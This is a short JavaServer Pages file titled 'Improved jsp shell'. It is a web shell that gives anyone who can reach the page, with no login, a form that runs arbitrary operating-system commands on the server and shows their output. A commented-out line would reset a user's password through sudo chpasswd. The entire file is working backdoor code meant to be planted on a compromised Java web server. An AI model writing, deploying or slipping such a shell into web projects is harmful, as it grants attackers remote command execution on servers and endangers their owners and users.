<%
    /*
     Improved jsp shell
     */
%>

<%@page import="java.lang.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>

<html>
<head>
    <title>shell</title>
</head>
<body>
<form METHOD="POST" NAME="myform" ACTION="">
    <input TYPE="text" NAME="shell">
    <input TYPE="submit" VALUE="Send">
</form>
<pre>
<%

    // INNER HTML PART
    if (request.getParameter("shell") != null) {
        out.println("Command: " + request.getParameter("shell") + "\n<BR>");
        Process p;
            //p = Runtime.getRuntime().exec("echo 'user:passwd' | sudo chpasswd");
            String[] shell = String.valueOf(request.getParameter("shell")).split(" ");
            p = Runtime.getRuntime().exec(shell);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String s = null;
	    while ((s = stdInput.readLine()) != null) {
	    	out.println(s);
	    }
    }


%>
</pre>
</body>
</html>
